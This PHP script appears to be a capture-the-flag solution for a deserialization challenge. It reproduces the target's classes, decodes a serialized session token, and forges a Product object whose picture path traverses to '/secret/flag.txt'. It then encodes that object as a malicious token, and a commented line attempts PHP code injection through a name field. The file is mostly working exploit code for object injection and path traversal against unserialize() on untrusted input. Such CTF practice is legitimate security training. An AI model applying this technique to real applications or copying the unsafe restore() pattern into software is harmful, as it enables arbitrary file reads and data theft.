<?php

class Product {
    private $id;
    private $name;
    private $description;
    private $picture = "/secret/flag.txt";
    private $price;

    function __construct($id, $name, $description, $picture, $price) {
        $this->id = $id;
        $this->name = $name;
        $this->description = $description;
        $this->picture = $picture;
        $this->price = $price;
    }
    function getPicture() {
        $path = '/var/www/assets/' . $this->picture;
        $data = base64_encode(file_get_contents($path));
        return $data;
    }
}
class State {

    private $session;
    private $cart;

    function __construct($session) {
        $this->session = $session;
        $this->cart = array(new Product(10,"flag","i want the flag","/secret/flag.txt",10000));
    }

    function getSessionID() {
        return $this->session->getId();
    }

    function getSession() {
        return $this->session;
    }

    function getCart() {
        return $this->cart;
    }

    function clearCart() {
        $this->cart = array();
    }

    function addToCart($product_id) {
        if(array_key_exists($product_id, $this->cart)) {
            $this->cart[$product_id]++;
        } else {
            $this->cart[$product_id] = 1;
        }
    }

    function toDict() {
        $out = array();
        foreach($this->cart as $product_id => $quantity) {
            array_push($out, array("product" => $product_id, "quantity" => $quantity));
        }
        return array("name" => $this->session->getName(), "email" => $this->session->getEmailAddress(), "cart" => $out);
    }

    function save() {
        return base64_encode(gzcompress(serialize($this)));
    }

    static function restore($token) {
        return unserialize(gzuncompress(base64_decode($token)));
    }

}

class Session {

    private $id;
    private $name;
    private $email_address;

    function __construct($id, $name, $email_address) {
        $this->id = $id;
        $this->name = $name;
        $this->email_address = $email_address;
    }

    function getId() {
        return $this->id;
    }

    function getName() {
        return $this->name;
    }

    function getEmailAddress() {
        return $this->email_address;
    }

}

class Item {

    private $product;
    private $quantity;

    function __construct($prod){
        $this->product = $prod;
    }

    function getProduct() {
        return $this->product;
    }

    function getQuantity() {
        return $this->quantity;
    }

}

$token = "eJytkUFuwjAQRXMUaw5QHBpAGq+qHoBKnMA4k3TUNEH2IEAod8cOJMoG0UUX3jz975lnb3GFsBMrBLjEa8C8QMgGkAUKgbsWzBY3CF++K49OIBZSLI+xB8q4BMOYm4jfZ7i1vwQJrhE+m87+qK5SHzU3LJfEl3oWLik4zwcZBoY0cH8hFc94w5Q8sJOjn/gikPMki6qx9ZucZeDFPO/Z0bCg1tr0j93vis76WLBJnVH/VVQ/M41j0xqv5PL45qxOthUl36TGyv9ZRs30H4yF6fsbv96UZQ==";
$state = gzuncompress(base64_decode($token));
print($state);

print("\n\n");
#$session = new Session("6249587bf3f7a1bbe375651d4d623148133a933692623fb8a40b5d8c7d3cf4e4","<?php><?php \$product = new Product(1,\"ciao\", \"ciao\", \"/secret/flag.txt\",1000); \$string = \$product.getPicture(); echo \$string;&#63>","ciao");
$session = new Session("6249587bf3f7a1bbe375651d4d623148133a933692623fb8a40b5d8c7d3cf4e4","/secret/flag.txt","ciao");

$prod = new Product(1,"Cloak of Agility","bye bye", "/../../../secret/flag.txt", 1000);
$state = new State($prod);


print($session->getName());
#print(base64_decode($token));
print(serialize($state));
print(base64_encode(gzcompress(serialize($prod))));

?>

